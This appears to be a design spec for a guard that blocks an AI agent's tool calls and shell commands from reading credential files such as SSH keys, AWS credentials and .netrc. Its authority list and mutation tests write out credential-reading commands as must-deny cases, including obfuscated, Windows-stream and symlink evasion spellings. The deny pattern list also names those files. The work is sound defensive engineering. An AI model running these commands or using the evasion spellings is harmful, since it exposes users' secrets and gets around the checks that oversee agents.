7. **Raw-only cap**: check the length before `expandvars` only → the `$CLIENT_A_PAD` path, list-of-N and
   command-word cases lose `path-too-long` and exceed their time limits. (Removing the cap entirely also fails the
   4,098- and 400k-char cases.)
8. **Rule after `strip_wrappers`**: move the rule below `core = strip_wrappers(words)` / `if not core: return None`
   (or scan `core` instead of `words`) → `K=~/.aws; cat $K/credentials`, `xargs -a ~/.ssh/id_rsa echo` and
   `env -C ~/.aws cat credentials` pass.
9. **No casefold**: drop `casefold()` from `match_forms` → `~/.SSH/ID_RSA` and `~/.Aws/Credentials` pass.
10. **Memo per `_check`**: create the `Scan` in every `_check` call instead of once per top-level call → the
    memo-count test fails (the judge counted 15 calls).
11. **Memo kept across calls**: a module-level `Scan`/dict, or `functools.lru_cache` on `sensitive_rule` → the
    two-call symlink test's second call returns `None`.
12. **No budget**: never charge `components_left`, or reset it per word or per `_check` → the distinct-word
    vectors and the 2,000-element path list lose `path-budget` and fail check (iii) or (ii). The shared-budget
    case fails if the path branch and the command branch use separate `Scan`s.
13. **Unbounded walk**: replace `realpath_bounded` with `Path(s).resolve()` plus a string-component charge (rev 4),
    or remove the `MAX_SYMLINKS` check → the symlink-amplification cases exceed 0.25 s and return `None`; the
    41-link and loop cases no longer give `path-budget`. Replacing the fd walk with whole-prefix `lstat` → the
    deep-tree cases exceed 0.25 s.
14. **Shared budget leaks**: a module-level `Scan`, or `call_scope()` that never resets its token (or resets it
    when not the opener) → the sequential, command-form and thread isolation tests give `path-budget` on the
    second call; resetting in a nested scope → the shared-budget case gives `None`.
Spare: delete the path-key branch in `_guard` → `{"path": "/root/.ssh/id_rsa"}` passes; drop the segment
stripping → `_netrc::$DATA` and `.ssh.\config` pass; drop the drive split → `type C:.aws\credentials` passes; flip the MCP keyword default → the live MCP launch test raises; replace `_PATTERN_RE` with a regex that
drops one pattern → the equivalence test fails.

**Equivalence (A37):** for every string `f` built from the test plan (all must-deny and must-pass paths and
command words, each passed through `match_forms(expanded, resolve=False)`), plus every pattern rewritten as a
concrete path (`*` → `x`, both with and without a trailing `/`), assert
`(_PATTERN_RE.match(f) is not None) == any(fnmatch.fnmatchcase(f, p) for p in SENSITIVE_PATH_PATTERNS)`.

### Dependencies
None (stdlib: `fnmatch`, `os.path`, `posixpath`, `pathlib`).

### Ported vs net-new
| part | source | port as |
|---|---|---|
| pattern constant, always-on, checked first | OH31 `checker.py:14-33`, `:84-98` | adapt |
| dir-root trailing-slash forms | `checker.py:159-169` | adapt |
| expanduser + resolve before matching; keys `file_path`/`path`/`root` | `query.py:1026-1032` | adapt |
| command-string scanning as a segment rule (both streams, nested payloads, per-call `Scan` memo and component budget, one combined regex), casefold, drive-relative split, Windows form and segment stripping, lexical+resolved forms, fail closed, path cap, no-echo text, extra keys, extra patterns, MCP-launch opt-out | — | net-new |

### Quant guardrails
Not applicable (no pricing, returns, backtests or data splits in this change).

### Out of scope
- Routing `Workspace` reads through the matcher. No agent-facing caller exists today; add it when a file tool is
  built (that tool gets the guard for free via `path` args).
- OH32 full evaluation order and plan mode.
- Interactive confirmation.
- Checking `StdioServer.cwd`.

## Authority List

| id | claim | evidence | slice |
|---|---|---|---|
| A1 | Sensitive patterns are a module constant denied regardless of permission mode or user config | references/openharness/src/openharness/permissions/checker.py:14 ; references/openharness/src/openharness/permissions/checker.py:18 | 3 |
| A2 | `*/.ssh/*` is a sensitive pattern | references/openharness/src/openharness/permissions/checker.py:20 | 3 |
| A3 | AWS `credentials` and `config` under `.aws` are sensitive (widened in A16) | references/openharness/src/openharness/permissions/checker.py:22 ; references/openharness/src/openharness/permissions/checker.py:23 | 3 |
| A4 | `*/.config/gcloud/*` is a sensitive pattern | references/openharness/src/openharness/permissions/checker.py:25 | 3 |
| A5 | `*/.azure/*` is a sensitive pattern | references/openharness/src/openharness/permissions/checker.py:27 | 3 |
| A6 | `*/.gnupg/*` is a sensitive pattern | references/openharness/src/openharness/permissions/checker.py:29 | 3 |
| A7 | `*/.docker/config.json` is a sensitive pattern | references/openharness/src/openharness/permissions/checker.py:31 | 3 |
| A8 | `*/.kube/config` is a sensitive pattern | references/openharness/src/openharness/permissions/checker.py:33 | 3 |
| A9 | The sensitive check runs before any deny/allow list or mode, so an allow entry cannot pre-empt it | references/openharness/src/openharness/permissions/checker.py:84 ; references/openharness/src/openharness/permissions/checker.py:105 | 3 |
| A10 | Each path is matched both without and with a trailing `/` so a directory root matches `*/dir/*` | references/openharness/src/openharness/permissions/checker.py:169 | 3 |
| A11 | Paths are `~`-expanded and resolved (symlinks, `..`) before matching | references/openharness/src/openharness/engine/query.py:1029 ; references/openharness/src/openharness/engine/query.py:1032 | 3 |
| A12 | Path arguments are taken from keys `file_path`, `path`, `root` | references/openharness/src/openharness/engine/query.py:1026 | 3 |
| A13 | Matching uses fnmatch glob patterns | references/openharness/src/openharness/permissions/checker.py:91 | 3 |
| A14 | `.openharness/*` credential-store patterns are not ported | NET-NEW — those files belong to OpenHarness, not Master FinHub; verification: `tests/test_sensitive_paths.py` asserts `"openharness" not in "".join(SENSITIVE_PATH_PATTERNS)` | 3 |
| A15 | CHANGED r2 — Shell-command strings are scanned by a `sensitive-path` rule at the top of `segment_rule`, so every word of every segment is checked in both token streams and in every inline payload that `_inline_rule` re-lexes (`-c`, `/c`, `-Command`, `eval`) | NET-NEW — the source checks only `file_path` (`checker.py:88`); finding 1 shows `cat ~/.ssh/id_rsa` passes today; rev 1's word-level pre-scan missed payloads with their own quoting; verification: `bash -c 'cat ~/.a"w"s/credentials'`, `bash -c "cat ~/.a\ws/credentials"`, `sh -c 'cat ~/.n\etrc'`, `eval 'cat ~/.a"w"s/credentials'` denied (mutation 6); POSIX-only `cat ~/.a"w"s/credentials`, `cat ~/.n'e'trc` denied (mutation 4) | 3 |
| A16 | `.aws` widened to the whole dir; `.docker` and `.kube` dir roots denied | NET-NEW — `cp -r ~/.aws dst` / `cp -r ~/.docker dst` copy the credential files while naming only the dir, and `.aws/sso/cache/*.json` holds session tokens; verification: `cp -r ~/.aws /workspace/x`, `cp -r ~/.docker x`, `cp -r ~/.kube x`, `~/.aws/sso/cache/a.json` denied while `/workspace/proj/.docker/compose.yml` passes | 3 |
| A17 | CHANGED r3 (cross-reference only) — Both forms and patterns are casefolded before matching | NET-NEW — macOS and Windows filesystems are case-insensitive, so `~/.SSH/ID_RSA` is the same file there; verification: `~/.SSH/ID_RSA` and `~/.Aws/Credentials` denied (mutation 9) | 3 |
| A18 | Backslashes are converted to `/` in the lexical form and the non-POSIX token stream is scanned | NET-NEW — Windows paths; POSIX lexing strips backslashes (`C:Usersa.sshid_rsa`); verification: `type C:\Users\client_a\.ssh\id_rsa` and `{"path": "C:\\Users\\client_a\\.aws\\credentials"}` denied | 3 |
| A19 | CHANGED r3 — A lexical form (backslashes to `/`, drive split, segment stripping, `normpath`) is matched in addition to the resolved form; deny if any form matches | NET-NEW — `Path.resolve` treats a Windows path on a POSIX host as one relative name (`<cwd>/C:\Users\...`), so the resolved form alone misses backslash Windows spellings; verification: `{"path": "C:\\Users\\client_a\\.aws\\credentials"}` and `type C:\Users\client_a\.ssh\id_rsa` denied, and both fail under mutation 3 "resolved form only" (`c:/users/client_a/_netrc` is coverage, not a killing test) | 3 |
| A20 | CHANGED r4 (verification wording only) — Any exception while expanding, normalising, resolving or matching is a denial | NET-NEW — matches safety.py's fail-closed convention (module docstring :11); verification: NUL-byte path, patched `Path.resolve` raising `OSError`, patched `sensitive_paths.sensitive_rule` raising (safety.py calls it through the module) (mutation 2) | 3 |
| A21 | CHANGED r2 — `CommandPolicy` (denylist or allowlist), sub-agent and team guards cannot disable the check: `sensitive-path` is returned by `check_rule` (safety.py:519), before both allow exits of `check_command` (:523, :535) | NET-NEW — ordering inside our `check_command`; verification: the pinned allowlist table (cat, cp, scp, rsync, tar, base64, git, grep, the sensitive path in a non-first position) each denied via `check_command`, `make_guard` and `_both` (mutations 1 and 5) | 3 |
| A22 | Denial text echoes neither path, command nor matched pattern | NET-NEW — departs from the source, which echoes path and pattern (`checker.py:95`); keeps safety.py's never-echo convention; verification: denial contains none of `client_a`, `acct_001`, `.ssh`, `.aws`, `*/` | 3 |
| A23 | Path keys extended to `paths, filepath, filename, file, dir, directory, cwd, source, destination, src, dst, target, uri`, case-insensitive, list values checked element-wise | NET-NEW — MCP tools forward arbitrary argument names (`mcp/client.py:421`); verification: `{"Path"}`, `{"FILE_PATH"}`, `{"paths": [...]}`, nested `{"source"}`, `{"cwd"}` cases denied; spare mutation | 3 |
| A24 | `*/.netrc` and `*/_netrc` are sensitive | NET-NEW — plaintext login/password store read by curl, git and ftp (`_netrc` on Windows); verification: `~/.netrc`, `~/_netrc`, `c:/users/client_a/_netrc` denied; `/workspace/.netrc.example` passes | 3 |
| A25 | `*/.npmrc` is sensitive | NET-NEW — holds `_authToken` registry tokens; accepted false positive on project `.npmrc`; verification: `~/.npmrc` denied | 3 |
| A26 | `*/.pypirc` is sensitive | NET-NEW — holds PyPI upload tokens/passwords; verification: `~/.pypirc` denied | 3 |
| A27 | `*/.git-credentials` is sensitive | NET-NEW — plaintext store of git's `store` credential helper; verification: `~/.git-credentials` denied | 3 |
| A28 | Private keys named `id_rsa`, `id_dsa`, `id_ecdsa`, `id_ed25519` are sensitive in any folder; `.pub` files are not | NET-NEW — keys are copied out of `~/.ssh` (backups, CI folders) where `*/.ssh/*` no longer applies; verification: `/srv/keys/id_*` and bare `id_rsa` denied; `/workspace/id_rsa.pub` and `known_id_rsa_fingerprint.txt` pass | 3 |
| A29 | The hook lives in `safety._guard`/`check_command`, so every runtime (CLI, server, sub-agent, team, evals) gets it without wiring changes | NET-NEW — all five call sites use `guard_tool_call`/`make_guard` (finding 3); verification: `AgentLoop(..., guard=guard_tool_call)` with a spy tool never runs it for `{"path": "~/.ssh/id_rsa"}` | 3 |
| A30 | WITHDRAWN r2 — (was: scope statement for "Does not cover"; not falsifiable) | — | 3 |
| A31 | CHANGED r4 — The MCP server launch check (`mcp/client.py:149`) passes `sensitive_paths=False`: launch argv naming a credential path (e.g. `--kubeconfig ~/.kube/config`) is allowed, and destructive launch lines are still denied | NET-NEW — `StdioServer.command` (client.py:70-72) is operator-written Python config, never model output, and credential-consuming MCP servers legitimately name their config; verification: `check_command(shlex.join(("kube-mcp","--kubeconfig","~/.kube/config")), sensitive_paths=False) is None`; live stub launch with `~/.kube/config` in argv does not raise `McpError`; `test_denied_launch_command_never_spawns` still raises; AST scan of `src/`: every `ast.Call` carrying a `sensitive_paths`/`sensitive`/`scan`/`memo` keyword is a violation except exactly one in `tools/mcp/client.py` whose value `is False`; string constants `"sensitive_paths"` or private names are violations; private names count only when reached through a name bound to `master_finhub.tools.safety`. Tree: 0 violations, allowed 1. Each of 11 negative spellings (alias, `functools.partial`, `getattr`, `=0`, `**{}`, private import/attr/getattr/dotted, `scan=`, client `=0`) is flagged; `self._check`/`bus._check()` are not | 3 |
| A32 | NEW r2 — `DockerEngine.stream/run` (`docker_engine.py:123`) keeps the default, so an in-container command naming a credential path raises `CommandBlocked` before anything spawns | NET-NEW — defence in depth for direct engine callers and for a workspace bind mount (:104) that is home; verification: with `subprocess.Popen` patched to raise, `stream("cat ~/.ssh/id_rsa")` and `run(...)` raise `CommandBlocked` whose text has `sensitive-path` and not `id_rsa` | 3 |
| A33 | CHANGED r3 — The length cap applies to the raw value **and to its `~`/`$VAR` expansion**, inside the matcher: path arguments > 4,096 chars, command words > 10,000 chars after expansion → `path-too-long`; `resolve` never runs on an expansion > 4,096 | NET-NEW — `Path.resolve` cost grows quadratically with component count and `expandvars` can multiply a short value (judge: `{"path": "$PATH"*819}` 4,095 raw → 182k expanded, 0.40 s; ten in a list 4.5 s; `"cat "+"$PATH"*1990` 4.8 s); 4,096 = Linux `PATH_MAX`, 10,000 = existing `MAX_COMMAND_CHARS` (safety.py:26); simulated rev 3: `"cat "+"$PATH"*1990` → `path-too-long` in 0.010 s; verification: 4,098-char, 400k-char, `$CLIENT_A_PAD`*300, list-of-10 and command-word `$CLIENT_A_PAD`*700 cases → `path-too-long` within their limits; 4,011-char value passes (mutation 7) | 3 |
| A34 | CHANGED r3 — In the lexical form, each segment other than `.`/`..` loses any `:<stream>` suffix (a drive `x:` in segment 0 is kept) and trailing dots and spaces before matching | NET-NEW — Win32 strips trailing dots/spaces and accepts `::$DATA` stream suffixes, so end-anchored patterns missed `_netrc.`, `_netrc::$DATA`, `.git-credentials.`; verification: those three, `.kube\config ` and `.ssh.\config` denied (the last only via stripping); `notes.txt.` and `/workspace/report.v1.` pass; spare mutation | 3 |
| A35 | CHANGED r4 — Inside commands, the resolved form is computed only for words containing `/` or `\` or starting with `~`, `.` or `$`; every word gets the lexical form; path arguments are always resolved. With A33, A36, A37 and A40, the new rule's cost on the same host stays within +0.1 s of `check_rule(v, sensitive_paths=False)` on every listed vector, single-level vectors stay under 0.25 s, and no vector exceeds 0.5 s | NET-NEW — measured on the rev-4 simulation (3.11.15, 4 cores): worst best-of-5 increment +0.053 s across 11 vectors, including the judge's distinct-word vector (→ `path-budget` in 0.06 s, rev 3 0.24-0.37 s) and its triple-nested form (0.06 s); single-level worst 0.064 s; existing ADVERSARIAL worst 0.073-0.084 s, first-19 0.46-0.52 s; suites 294 passed / 5 skipped in 6 of 7 runs (one loaded-box failure, not captured, three clean re-runs); verification: the vector table under checks (i) < 0.5 s, (ii) increment < 0.1 s best-of-3, (iii) single level < 0.25 s, plus the existing linear test (mutations 10, 12) | 3 |
| A36 | CHANGED r4 — Matching results are memoised in one `sensitive_paths.Scan` per top-level call (one per `_guard` call, shared by its path arguments and command values; else one per direct `check_rule`/`check_command` call). Command words are keyed by word, path values by value. The `Scan` is shared by both token streams and every nested payload, and is never stored at module level or kept across calls | NET-NEW — `_inline_rule` re-scans `" ".join(args[i+1:])` for unquoted chains, so `bash -c ` ×3 scans each word 30 times (judge r2); a memo kept across calls would return a stale allow after a symlink swap (judge r3 simulated it); verification: counting wrapper sees `"./a"` matched at most once for `"bash -c "*3 + "./a "*100` (mutation 10); two-call symlink-flip test: call 1 `cat ./notes.txt` → `None`, swap the file for a symlink to `$HOME/.aws/credentials`, call 2 → `sensitive-path`, also via `guard_tool_call` command and path forms (mutation 11) | 3 |
| A37 | CHANGED r4 — All patterns are matched by ONE regex compiled at import from `"|".join(fnmatch.translate(p) for p in SENSITIVE_PATH_PATTERNS)`, applied to casefolded forms. It is an implementation choice with the same result as a per-pattern `fnmatchcase` loop, and is not required for performance | NET-NEW — one match call per form instead of 18, with semantics identical to the source's per-pattern `fnmatch` (checker.py:91, A13). With the A36 memo, the per-pattern loop also meets every limit (judge r3), so no timing claim rests on this; verification: equivalence test, regex result == `any(fnmatchcase(f, p) for p in SENSITIVE_PATH_PATTERNS)` on every must-deny/must-pass form and on each pattern made concrete with and without a trailing `/` (simulated: equal); a regex missing one pattern fails it | 3 |
| A38 | NEW r3 — The command rule is the first statement of `segment_rule` and scans the raw `words` (before `strip_wrappers` and before `if not core: return None`), so assignment words and wrapper arguments are checked | NET-NEW — `strip_wrappers` (safety.py:216-235) discards `VAR=x` words and wrapper flag values such as `xargs -a FILE` and `env -C DIR`; verification: `K=~/.aws; cat $K/credentials`, `xargs -a ~/.ssh/id_rsa echo`, `env -C ~/.aws cat credentials` denied (mutation 8); `env -C /workspace cat notes.txt` passes | 3 |
| A39 | NEW r3 — In the lexical form, a segment-0 `x:rest` (one-letter drive followed by text) is split into `x:` and `rest` before stream stripping | NET-NEW — Windows drive-relative paths (`C:.aws\credentials` = `.aws\credentials` on drive C's current directory); without the split, stream stripping deleted `.aws` (judge N1); verification: `type C:.aws\credentials`, `type C:.ssh\config`, `{"path": "C:.aws\\credentials"}` denied; `cat c:/x`, `cat a:b/.ssh-x`, `scp report.csv host:/tmp/` pass | 3 |
| A40 | CHANGED r5 — Each top-level call (one `Scan`, shared via A41) may visit at most `RESOLVE_COMPONENT_BUDGET = 16_384` path components in `realpath_bounded`, counting every component popped: those of the string, of every symlink target, and of the cwd prefix of relative paths. Each path may follow at most `MAX_SYMLINKS = 40` symlinks. Exceeding either returns `path-budget`, a denial; nothing is skipped silently. Lexical forms are matched before any walk. Path arguments and command values in one `_guard` call share the budget | NET-NEW — rev 4 charged only the string, but `Path.resolve` walks symlink targets with no symlink limit. Planted chains cost 0.87-18.7 s for a 483-char command (judge r4, reproduced). With the walk charging target components and capping at 40 (= Linux MAXSYMLINKS, so no path the kernel could open is lost), the same attacks give `path-budget` in 0.017-0.032 s. 16,384 fits 2,000 legit 6-segment paths (0.041 s, `None`); a symlinked workspace with ≤ 40 links per path passes; verification: chain (single word, 20 spellings, 20 path args), flat (1 word, 11 path args) and deep-tree cases → `path-budget` < 0.25 s; 40-link chain `None`, 41-link and loop `path-budget`; 3-link symlinked workspace `None`; patched budget 10: `/a/b /c/d /e/f` passes, adding `/g/h` denies; shared-budget case (2,500 paths + 500-word command) → `path-budget`, each alone `None` (mutations 12, 13) | 3 |
| A41 | NEW r5 — The call's `Scan` is shared through a `contextvars.ContextVar` opened by `call_scope()` in `_guard` and in `_check(depth=0)`. Only the opener sets and resets it, in `finally`; a nested opener reuses it. `check_command`, `check_rule` and `_check_value` keep their existing call shapes, with no new keyword | NET-NEW — a `scan=` keyword through `_check_value` → `check_command` breaks the existing `tests/test_modes.py::test_empty_string_denial_blocks` (stub `lambda value, policy=None`, :555-556; judge r4: 3/3 failures). A ContextVar is per-thread and needs no signature change; verification: the 6 existing suites pass unmodified 3/3 (294 passed, 5 skipped, T41 included); sequential guard calls, sequential `check_rule` calls (budget 6,000) and 2 threads × 20 calls with distinct paths all `None`, but `path-budget` under the module-global and not-reset mutants; `current_scan() is None` after a call (mutation 14) | 3 |
| A42 | NEW r5 — `realpath_bounded` keeps one directory fd and uses `os.stat`/`os.open`/`os.readlink` with `dir_fd`, so each visited component costs O(1) syscalls regardless of depth. It appends names without syscalls after a missing component until `..` climbs above it, and returns the same path as `os.path.realpath` | NET-NEW — whole-prefix `lstat` (and `Path.resolve`) costs O(depth) per component in the kernel: a 1,000-level existing tree took 0.50 s for 30 path args and 4.6 s for 2,000 via a symlink, vs 0.058 s and 0.050 s with the fd walk; verification: equivalence with `os.path.realpath` on 2,000 seeded random paths × 2 (simulated on 40,000: 0 differences), deep-tree cases < 0.25 s (mutation 13) | 3 |
